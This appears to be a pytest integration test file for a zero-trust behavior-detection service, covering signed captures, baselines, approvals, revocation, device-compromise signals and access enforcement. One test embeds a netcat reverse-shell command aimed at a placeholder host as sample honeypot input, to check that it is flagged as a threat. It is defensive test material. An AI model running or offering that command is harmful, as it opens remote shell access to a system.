"""Controlled local captures with real signatures, durable intake, worker and access policy.

These are behavioral integration cases, not an independent public accuracy benchmark.
"""

import base64
import hashlib
import json
import sqlite3
from datetime import UTC, datetime, timedelta
from types import SimpleNamespace

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.behavior_context_api import behavior_context_router
from app.behavior_context_models import (
    ApprovalCreate,
    BaselineCreate,
    BehaviorScope,
    ContextRevocation,
    SignedBehaviorCapture,
)
from app.behavior_execution_models import SignedExecutionEvidence
from app.continuous_signal_models import SignedContinuousSignal
from app.models import SecurityEvent
from app.scenarios import synthetic_events
from app.security import Principal, Role, get_principal
from app.services.behavior_context import BehaviorContextService, ContextInvalid, ContextNotFound
from app.services.behavior_context_store import BehaviorContextStore, ContextStoreUnavailable
from app.services.continuous_signals import ContinuousSignalService
from app.services.signal_inbox import SignalInbox
from app.services.trusted_signals import (
    SignalRejected,
    SignalVerifier,
    canonical_execution_evidence,
    canonical_observation,
    canonical_signal,
)
from app.services.zero_trust import JournalUnavailable, ZeroTrustOperations
from app.zero_trust_api import install_zero_trust_error_handlers, zero_trust_router
from app.zero_trust_models import SessionRevocationRequest, SignedSessionSignal


def signature(key, payload):
    return base64.urlsafe_b64encode(key.sign(payload)).decode().rstrip("=")


def capture_bytes(capture):
    return json.dumps(capture.model_dump(mode="json", exclude={"signature"}),
                      sort_keys=True, ensure_ascii=False, separators=(",", ":")).encode()


@pytest.fixture
def context_lab(tmp_path, monkeypatch):
    now = datetime(2026, 11, 10, 9, tzinfo=UTC)
    clock = SimpleNamespace(now=now)
    operator = Principal("context-admin", "tenant-a", frozenset({Role.ADMIN}), "api_key")
    analyst = Principal("context-reader", "tenant-a", frozenset({Role.ANALYST}), "api_key")
    keys = {name: Ed25519PrivateKey.generate() for name in ("session", "behavior", "device", "execution")}
    scope = BehaviorScope(source="cloudtrail", user_id="user-a", device_id="device-a",
                          resource_id="zt-demo-documents", action="READ", principal_hash="actor-a")
    scope_b = scope.model_copy(update={"user_id": "user-b", "device_id": "device-b",
                                      "principal_hash": "actor-b"})

    def source(name, **extra):
        public = keys[name].public_key().public_bytes(
            serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode()
        return {"source_id": name, "tenant_id": "tenant-a", "enabled": True,
                "user_ids": ["user-a", "user-b"], "device_ids": ["device-a", "device-b"],
                "roles": ["employee"], "keys": [{
                    "key_id": "key-1", "public_key_pem": public, "enabled": True,
                    "not_before": (now - timedelta(days=1)).isoformat(),
                    "not_after": (now + timedelta(days=1)).isoformat(),
                }], **extra}

    registry = {"sources": [source("session"), source("behavior", behavior_scopes=[
        scope.model_dump(mode="json"), scope_b.model_dump(mode="json"),
    ]), source("device", observation_kinds=["device"]), source("execution", execution_scopes=[
        scope.model_dump(mode="json"), scope_b.model_dump(mode="json"),
    ])]}
    registry_path = tmp_path / "registry.json"

    def save():
        registry_path.write_text(json.dumps(registry))

    save()
    operations_path = tmp_path / "operations.sqlite3"
    store_path = tmp_path / "behavior.sqlite3"
    operations = ZeroTrustOperations(operations_path, signal_verifier=SignalVerifier(registry_path))
    store = BehaviorContextStore(store_path)
    service = BehaviorContextService(store, operations)
    intake = ContinuousSignalService(operations, SignalInbox(operations_path))

    class Clock(datetime):
        @classmethod
        def now(cls, tz=None):
            return clock.now.astimezone(tz) if tz else clock.now.replace(tzinfo=None)

    monkeypatch.setattr("app.services.zero_trust.datetime", Clock)
    monkeypatch.setattr("app.services.behavior_context.datetime", Clock)

    def at(offset):
        return now + timedelta(seconds=offset)

    def start(name, offset=0, *, bound=scope):
        instant = at(offset)
        event = synthetic_events()[0].model_dump(mode="json", exclude={"ground_truth"})
        event.update(event_id="session-event-" + name, timestamp=instant, action="READ")
        event["user"].update(user_id=bound.user_id, role="employee", active=True)
        event["device"].update(device_id=bound.device_id, managed=True, security_posture="healthy")
        event["resource"].update(resource_id=bound.resource_id, required_role=None)
        event["auth_context"].update(authentication_result="success", mfa="success")
        request = SignedSessionSignal(
            session_id="session-" + name, expected_version=0, event=SecurityEvent.model_validate(event),
            tenant_id="tenant-a", source_id="session", key_id="key-1", issued_at=instant,
            expires_at=instant + timedelta(seconds=90), signature="A" * 86,
        )
        request = request.model_copy(update={"signature": signature(keys["session"], canonical_signal(request))})
        result = operations.evaluate_signed(request, operator, now=instant)
        assert result.session.status == "ACTIVE"
        return result

    def capture(name, offset=0, *, count=100, bound=scope, operation="PutObject", accepted=True,
                execution=True):
        session = start(name, offset, bound=bound)
        instant = at(offset)
        connection = "credential-" + name
        activity = {"source": bound.source, "original_group_id": "group-" + name,
                    "events": [{
                        "id": f"event-{name}-{index}", "timestamp": instant,
                        "kind": "AwsApiCall", "api_service": "s3.amazonaws.com",
                        "api_action": operation, "connection_id": connection,
                        "principal_hash": bound.principal_hash,
                        "resource_hashes": [f"object-{index % 25}"], "outcome": "success",
                    } for index in range(count)]}
        request = SignedBehaviorCapture(
            tenant_id="tenant-a", capture_id="capture-" + name,
            source_id="behavior", key_id="key-1", issued_at=instant,
            expires_at=instant + timedelta(seconds=90), scope=bound,
            session_id=session.session.session_id, session_version=session.session.version,
            session_input_sha256=session.session.input_digest_sha256,
            connection_ids=[connection], activity=activity, signature="A" * 86,
        )
        request = request.model_copy(update={"signature": signature(keys["behavior"], capture_bytes(request))})
        if accepted:
            service.accept_capture(request, analyst, now=instant)
        result = SimpleNamespace(request=request, session=session, id=request.capture_id)
        if accepted and execution and any(
            entry["kind"] == "approval" and entry["payload"]["scope"] == bound.model_dump(mode="json")
            for entry in store.read(operator.tenant_id)
        ):
            service.accept_execution_evidence(evidence(result), analyst, now=instant)
        return result

    def policy(bound=scope):
        return {"actor": {"principal_id": bound.principal_hash, "workload_id": "reviewed-job",
                          "executable_sha256": "a" * 64},
                "destinations": [{"kind": "https", "host": "archive.example.test",
                                  "port": 443, "path": "/backup"}]}

    def evidence(target, **updates):
        request = target.request
        expected = policy(request.scope)
        payload = {
            "evidence_id": "execution-" + request.capture_id, "tenant_id": request.tenant_id,
            "source_id": "execution", "key_id": "key-1", "issued_at": request.issued_at,
            "expires_at": request.expires_at, "observed_at": request.issued_at,
            "scope": request.scope, "session_id": request.session_id,
            "session_version": request.session_version,
            "session_input_sha256": request.session_input_sha256, "capture_id": request.capture_id,
            "capture_input_sha256": hashlib.sha256(capture_bytes(request)).hexdigest(),
            "event_ids": [event.id for event in request.activity.events],
            "connection_ids": request.connection_ids, **expected, "signature": "A" * 86,
            **updates,
        }
        value = SignedExecutionEvidence.model_validate(payload)
        return value.model_copy(update={"signature": signature(keys["execution"], canonical_execution_evidence(value))})

    def baseline(*, approve=True, operation="PutObject", approval_until=60, bound=scope,
                 execution_policy=True):
        samples = [capture(f"sample-{index}", index, operation=operation, bound=bound) for index in range(3)]
        request = BaselineCreate(
            baseline_id="baseline-a", capture_ids=[sample.id for sample in samples],
            valid_from=at(3), valid_until=at(300), note="Reviewed scheduled inventory maintenance",
        )
        service.create_baseline(request, operator, now=at(3))
        if approve:
            service.create_approval(ApprovalCreate(
                approval_id="approval-a", baseline_id=request.baseline_id,
                valid_from=at(3), valid_until=at(approval_until), note="Approved maintenance window",
                execution_policy=policy(bound) if execution_policy else None,
            ), operator, now=at(3))
        return samples

    def observation(*, offset=5, device="device-a", compromised=True, bad_signature=False):
        instant = at(offset)
        request = SignedContinuousSignal(
            tenant_id="tenant-a", event_id=f"device-report-{device}-{offset}",
            source_id="device", key_id="key-1", issued_at=instant,
            expires_at=instant + timedelta(seconds=90), observed_at=instant,
            observation={"kind": "device", "subject_id": device, "managed": True,
                         "security_posture": "compromised" if compromised else "unknown"},
            signature="A" * 86,
        )
        signer = Ed25519PrivateKey.generate() if bad_signature else keys["device"]
        return request.model_copy(update={"signature": signature(signer, canonical_observation(request))})

    def process(request):
        intake.accept(request, analyst, now=request.issued_at)
        reopened = ZeroTrustOperations(operations_path, signal_verifier=SignalVerifier(registry_path))
        worker = ContinuousSignalService(reopened, SignalInbox(operations_path))
        result = worker.process_one(now=request.issued_at)
        assert result["state"] == "completed"
        return result

    application = FastAPI()
    application.include_router(zero_trust_router(operations, intake))
    application.include_router(behavior_context_router(service))
    install_zero_trust_error_handlers(application)
    application.dependency_overrides[get_principal] = lambda: operator
    client = TestClient(application)

    def access(result, offset=6):
        clock.now = at(offset)
        return client.post("/zero-trust/protected-access", json={
            "session_id": result.session.session_id, "resource_id": result.session.resource_id,
            "action": result.session.action, "grant_token": result.grant_token,
        })

    return SimpleNamespace(
        now=now, at=at, operator=operator, analyst=analyst, scope=scope, scope_b=scope_b,
        keys=keys, registry=registry, registry_path=registry_path, save=save,
        operations=operations, operations_path=operations_path, store=store, store_path=store_path,
        service=service, intake=intake, capture=capture, baseline=baseline,
        observation=observation, process=process, access=access,
        policy=policy, evidence=evidence,
        app=application, client=client, clock=clock,
    )


@pytest.mark.parametrize("operation", ["PutObject", "DeleteObject", "GetObject"])
def test_reviewed_normal_bulk_work_is_not_a_threat(context_lab, operation):
    lab = context_lab
    lab.baseline(operation=operation)
    target = lab.capture("target", 4, operation=operation)
    before = lab.operations.history(target.session.session.session_id, lab.operator)
    result = lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))
    assert result["verdict"] == "normal"
    assert result["enforcement_eligible"] is False
    assert lab.operations.history(target.session.session.session_id, lab.operator) == before
    assert lab.access(target.session).status_code == 200


def test_same_scope_compromise_overrides_approval_and_existing_worker_denies_access(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    peer = lab.capture("peer", 4, bound=lab.scope_b)
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))["verdict"] == "normal"
    processed = lab.process(lab.observation())
    assert processed["result"]["changed_sessions"] >= 1
    before = lab.operations.history(target.session.session.session_id, lab.operator)
    result = lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))
    assert result["verdict"] == "threat"
    assert result["enforcement_eligible"] is False
    assert lab.operations.history(target.session.session.session_id, lab.operator) == before
    assert lab.access(target.session).status_code == 403
    assert lab.access(peer.session).status_code == 200


def test_untrusted_compromise_report_does_not_turn_approved_work_into_threat(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    with pytest.raises(SignalRejected):
        lab.intake.accept(lab.observation(bad_signature=True), lab.analyst, now=lab.at(5))
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))["verdict"] == "normal"
    assert lab.access(target.session).status_code == 200


def test_another_device_compromise_does_not_taint_normal_work(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    lab.process(lab.observation(device="device-b"))
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))["verdict"] == "normal"
    assert lab.access(target.session).status_code == 200


def test_manual_maintenance_isolation_is_not_compromise_evidence(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    lab.operations.revoke(target.session.session.session_id, SessionRevocationRequest(
        expected_version=1, note="Approved maintenance isolation",
    ), lab.operator, now=lab.at(5))
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))["verdict"] == "unknown"
    assert lab.access(target.session).status_code == 403


def test_unknown_device_posture_is_not_promoted_to_compromise(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    lab.process(lab.observation(compromised=False))
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))["verdict"] == "unknown"


def test_baseline_without_approval_stays_under_investigation(context_lab):
    lab = context_lab
    lab.baseline(approve=False)
    target = lab.capture("target", 4)
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))["verdict"] == "unknown"


@pytest.mark.parametrize("kind,record_id", [("approval", "approval-a"), ("baseline", "baseline-a")])
def test_revoked_context_cannot_continue_to_explain_new_work(context_lab, kind, record_id):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))["verdict"] == "normal"
    lab.service.revoke(kind, record_id, ContextRevocation(reason="Maintenance permission withdrawn"),
                       lab.operator, now=lab.at(5))
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))["verdict"] == "unknown"


def test_expired_approval_does_not_classify_work_as_normal(context_lab):
    lab = context_lab
    lab.baseline(approval_until=5)
    target = lab.capture("target", 4)
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))["verdict"] == "unknown"


@pytest.mark.parametrize("count,operation", [(125, "PutObject"), (100, "DeleteObject")])
def test_volume_or_action_outside_reviewed_profile_is_unknown_not_automatic_threat(
    context_lab, count, operation,
):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4, count=count, operation=operation)
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))["verdict"] == "unknown"


def test_approval_for_another_actor_does_not_explain_target_work(context_lab):
    lab = context_lab
    lab.baseline(bound=lab.scope_b)
    target = lab.capture("target", 4)
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))["verdict"] == "unknown"


def test_context_and_capture_history_survive_reopen(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    first = lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))
    reopened = BehaviorContextService(
        BehaviorContextStore(lab.store_path),
        ZeroTrustOperations(lab.operations_path, signal_verifier=SignalVerifier(lab.registry_path)),
    )
    assert reopened.evaluate(target.id, lab.analyst, now=lab.at(5))["verdict"] == first["verdict"] == "normal"


def test_capture_signature_tampering_is_rejected_before_storage(context_lab):
    lab = context_lab
    target = lab.capture("target", 4, accepted=False)
    altered = target.request.model_copy(update={"capture_id": "different-capture"})
    with pytest.raises(SignalRejected):
        lab.service.accept_capture(altered, lab.analyst, now=lab.at(4))


def test_policy_journal_corruption_cannot_produce_a_normal_verdict(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    with sqlite3.connect(lab.operations_path) as connection:
        connection.execute("UPDATE journal SET payload='{}' WHERE seq=1")
    with pytest.raises((JournalUnavailable, ContextStoreUnavailable)):
        lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))


def test_analyst_cannot_publish_baselines_or_approve_work(context_lab):
    lab = context_lab
    samples = lab.baseline(approve=False)
    with pytest.raises(SignalRejected):
        lab.service.create_baseline(BaselineCreate(
            baseline_id="unprivileged-baseline", capture_ids=[sample.id for sample in samples],
            valid_from=lab.at(3), valid_until=lab.at(300), note="Unprivileged baseline request",
        ), lab.analyst, now=lab.at(3))
    with pytest.raises(SignalRejected):
        lab.service.create_approval(ApprovalCreate(
            approval_id="unprivileged-approval", baseline_id="baseline-a",
            valid_from=lab.at(3), valid_until=lab.at(60), note="Unprivileged approval request",
        ), lab.analyst, now=lab.at(3))


def test_other_tenant_cannot_read_or_evaluate_capture(context_lab):
    lab = context_lab
    target = lab.capture("target", 4)
    foreign = Principal("other-admin", "tenant-b", frozenset({Role.ADMIN}), "api_key")
    with pytest.raises(ContextNotFound):
        lab.service.evaluate(target.id, foreign, now=lab.at(4))
    assert lab.service.history(foreign) == []


def test_later_approval_cannot_retroactively_explain_earlier_capture(context_lab):
    lab = context_lab
    lab.baseline(approve=False)
    target = lab.capture("target", 4)
    with pytest.raises(ContextInvalid, match="backdated"):
        lab.service.create_approval(ApprovalCreate(
            approval_id="backdated", baseline_id="baseline-a",
            valid_from=lab.at(3), valid_until=lab.at(60), note="Attempted retroactive approval",
        ), lab.operator, now=lab.at(5))
    lab.service.create_approval(ApprovalCreate(
        approval_id="later-approval", baseline_id="baseline-a",
        valid_from=lab.at(5), valid_until=lab.at(60), note="New future work approval",
    ), lab.operator, now=lab.at(5))
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(6))["verdict"] == "unknown"


@pytest.mark.parametrize("reused", ["events", "group"])
def test_training_identifiers_cannot_be_relabelled_as_a_new_capture(context_lab, reused):
    lab = context_lab
    samples = lab.baseline()
    target = lab.capture("target", 4, accepted=False)
    payload = target.request.model_dump(mode="json")
    if reused == "events":
        for new, previous in zip(payload["activity"]["events"], samples[0].request.activity.events, strict=True):
            new["id"] = previous.id
    else:
        payload["activity"]["original_group_id"] = samples[0].request.activity.original_group_id
    request = SignedBehaviorCapture.model_validate(payload)
    request = request.model_copy(update={"signature": signature(lab.keys["behavior"], capture_bytes(request))})
    lab.service.accept_capture(request, lab.analyst, now=lab.at(4))
    assert lab.service.evaluate(request.capture_id, lab.analyst, now=lab.at(4))["verdict"] == "unknown"


def test_explicit_shell_attempt_cannot_be_enrolled_as_a_normal_baseline(context_lab):
    lab = context_lab
    bound = lab.scope.model_copy(update={"source": "cowrie"})
    lab.registry["sources"][1]["behavior_scopes"].append(bound.model_dump(mode="json"))
    lab.save()
    captures = []
    for index in range(3):
        target = lab.capture(f"shell-{index}", index, bound=bound, accepted=False)
        payload = target.request.model_dump(mode="json")
        payload["activity"]["events"] = [{
            "id": f"shell-attempt-{index}", "timestamp": lab.at(index).isoformat(),
            "kind": "cowrie.command.input", "command": "nc peer.invalid 4444 -e /bin/sh",
            "connection_id": target.request.connection_ids[0], "principal_hash": bound.principal_hash,
        }]
        request = SignedBehaviorCapture.model_validate(payload)
        request = request.model_copy(update={"signature": signature(lab.keys["behavior"], capture_bytes(request))})
        lab.service.accept_capture(request, lab.analyst, now=lab.at(index))
        captures.append(request)
    with pytest.raises(ContextInvalid, match="reviewed activity"):
        lab.service.create_baseline(BaselineCreate(
            baseline_id="unsafe-baseline", capture_ids=[capture.capture_id for capture in captures],
            valid_from=lab.at(3), valid_until=lab.at(60), note="Attempt to approve a remote shell",
        ), lab.operator, now=lab.at(3))
    result = lab.service.evaluate(captures[0].capture_id, lab.analyst, now=lab.at(3))
    assert result["verdict"] == "threat"
    assert result["reason"] == "EXPLICIT_REMOTE_SHELL_ATTEMPT"


def test_context_store_corruption_cannot_produce_a_normal_verdict(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("target", 4)
    with sqlite3.connect(lab.store_path) as connection:
        connection.execute("UPDATE behavior_context_entries SET payload='{}' WHERE seq=1")
    with pytest.raises(ContextStoreUnavailable):
        lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))


def test_context_http_workflow_and_current_worker_access_enforcement(context_lab):
    lab = context_lab
    prefix = "/detections/context"
    samples = []
    for index in range(3):
        sample = lab.capture(f"http-sample-{index}", index, accepted=False)
        lab.clock.now = lab.at(index)
        response = lab.client.post(prefix + "/captures", json=sample.request.model_dump(mode="json"))
        assert response.status_code == 201
        samples.append(sample)
    lab.clock.now = lab.at(3)
    baseline = BaselineCreate(
        baseline_id="http-baseline", capture_ids=[sample.id for sample in samples],
        valid_from=lab.at(3), valid_until=lab.at(60), note="Reviewed HTTP workflow maintenance",
    )
    assert lab.client.post(prefix + "/baselines", json=baseline.model_dump(mode="json")).status_code == 201
    approval = ApprovalCreate(
        approval_id="http-approval", baseline_id="http-baseline", valid_from=lab.at(3),
        valid_until=lab.at(60), note="Approved bounded HTTP maintenance",
        execution_policy=lab.policy(),
    )
    assert lab.client.post(prefix + "/approvals", json=approval.model_dump(mode="json")).status_code == 201
    target = lab.capture("http-target", 4, accepted=False)
    peer = lab.capture("http-peer", 4, bound=lab.scope_b, accepted=False)
    lab.clock.now = lab.at(4)
    assert lab.client.post(prefix + "/captures", json=target.request.model_dump(mode="json")).status_code == 201
    assert lab.client.post(prefix + "/execution-evidence", json=lab.evidence(target).model_dump(mode="json")).status_code == 201
    before = lab.operations.history(target.session.session.session_id, lab.operator)
    evaluated = lab.client.post(prefix + "/evaluate", json={"capture_id": target.id})
    assert evaluated.status_code == 200 and evaluated.json()["verdict"] == "normal"
    assert lab.operations.history(target.session.session.session_id, lab.operator) == before
    assert lab.client.post(prefix + "/evaluate", json={"capture_id": target.id,
                                                      "approval_verified": True}).status_code == 422
    lab.process(lab.observation())
    lab.clock.now = lab.at(6)
    evaluated = lab.client.post(prefix + "/evaluate", json={"capture_id": target.id})
    assert evaluated.status_code == 200 and evaluated.json()["verdict"] == "threat"
    assert evaluated.json()["trusted_evidence"]
    assert lab.access(target.session).status_code == 403
    assert lab.access(peer.session).status_code == 200
    history = lab.client.get(prefix + "/history")
    assert history.status_code == 200
    assert all(set(entry) == {"kind", "record_id", "actor", "created_at"} for entry in history.json())
    lab.app.dependency_overrides[get_principal] = lambda: lab.analyst
    assert lab.client.post(prefix + "/baselines", json=baseline.model_dump(mode="json")).status_code == 403
    assert lab.client.post(prefix + "/approvals", json=approval.model_dump(mode="json")).status_code == 403


def test_exact_context_retries_after_start_survive_reopen_without_reactivating_revocations(context_lab):
    lab = context_lab
    lab.baseline()
    entries = lab.store.read(lab.operator.tenant_id)
    baseline = BaselineCreate.model_validate(next(
        entry["payload"]["request"] for entry in entries if entry["kind"] == "baseline"
    ))
    approval = ApprovalCreate.model_validate(next(
        entry["payload"]["request"] for entry in entries if entry["kind"] == "approval"
    ))
    for kind, identifier in (("baseline", baseline.baseline_id), ("approval", approval.approval_id)):
        lab.service.revoke(kind, identifier, ContextRevocation(reason="Previously granted context revoked"),
                           lab.operator, now=lab.at(5))
    reopened = BehaviorContextService(
        BehaviorContextStore(lab.store_path),
        ZeroTrustOperations(lab.operations_path, signal_verifier=SignalVerifier(lab.registry_path)),
    )
    before = reopened.store.read(lab.operator.tenant_id)
    repeated_baseline = reopened.create_baseline(baseline, lab.operator, now=lab.at(6))
    repeated_approval = reopened.create_approval(approval, lab.operator, now=lab.at(6))
    assert repeated_baseline["duplicate"] and repeated_baseline["revoked"]
    assert repeated_approval["duplicate"] and repeated_approval["revoked"]
    assert reopened.store.read(lab.operator.tenant_id) == before
    target = lab.capture("after-revocation", 7)
    assert reopened.evaluate(target.id, lab.analyst, now=lab.at(7))["verdict"] == "unknown"


def test_reviewed_historical_captures_remain_usable_but_later_compromise_blocks_enrollment(context_lab):
    lab = context_lab
    samples = [lab.capture(f"historical-{index}", index) for index in range(3)]
    entries = lab.store.read(lab.operator.tenant_id)
    assert all(entry["payload"]["normal_session_at_acceptance"] for entry in entries)
    request = BaselineCreate(
        baseline_id="historical-baseline", capture_ids=[sample.id for sample in samples],
        valid_from=lab.at(100), valid_until=lab.at(300), note="Later review of authenticated normal captures",
    )
    # All three capture lifetimes and original grants have expired by review time.
    assert all(sample.request.expires_at < lab.at(100) for sample in samples)
    result = lab.service.create_baseline(request, lab.operator, now=lab.at(100))
    assert result["sample_count"] == 3 and result["duplicate"] is False
    lab.process(lab.observation(offset=101))
    with pytest.raises(ContextInvalid, match="reviewed activity"):
        lab.service.create_baseline(request.model_copy(update={
            "baseline_id": "after-compromise", "valid_from": lab.at(102),
        }), lab.operator, now=lab.at(102))


@pytest.mark.parametrize("max_uses", [1, 2])
def test_work_approval_limits_distinct_captures_without_charging_repeat_evaluation(context_lab, max_uses):
    lab = context_lab
    lab.baseline(approve=False)
    args = {} if max_uses == 1 else {"max_uses": max_uses}
    approval = ApprovalCreate(
        approval_id="quota-approval", baseline_id="baseline-a", valid_from=lab.at(3),
        valid_until=lab.at(60), note="Explicitly bounded recurring maintenance", **args,
        execution_policy=lab.policy(),
    )
    assert approval.max_uses == max_uses
    lab.service.create_approval(approval, lab.operator, now=lab.at(3))
    first = lab.capture("quota-first", 4)
    initial = lab.service.evaluate(first.id, lab.analyst, now=lab.at(4))
    assert initial["verdict"] == "normal" and initial["duplicate"] is False
    repeated = lab.service.evaluate(first.id, lab.analyst, now=lab.at(5))
    assert repeated["verdict"] == "normal" and repeated["duplicate"] is True
    for index in range(1, max_uses + 1):
        target = lab.capture(f"quota-next-{index}", 5 + index)
        result = lab.service.evaluate(target.id, lab.analyst, now=lab.at(5 + index))
        assert result["verdict"] == ("normal" if index < max_uses else "unknown")
    admitted = {entry["payload"]["capture_id"] for entry in lab.store.read(lab.operator.tenant_id)
                if entry["kind"] == "evaluation" and entry["payload"].get("verdict") == "normal"}
    assert len(admitted) == max_uses


def test_expired_capture_retry_returns_receipt_without_restoring_normal_eligibility(context_lab):
    lab = context_lab
    lab.baseline()
    target = lab.capture("expiring", 4)
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(4))["verdict"] == "normal"
    before = lab.store.read(lab.operator.tenant_id)
    assert target.request.expires_at < lab.at(100)
    receipt = lab.service.accept_capture(target.request, lab.analyst, now=lab.at(100))
    assert receipt["duplicate"] is True
    assert lab.store.read(lab.operator.tenant_id) == before
    assert lab.service.evaluate(target.id, lab.analyst, now=lab.at(100))["verdict"] == "unknown"
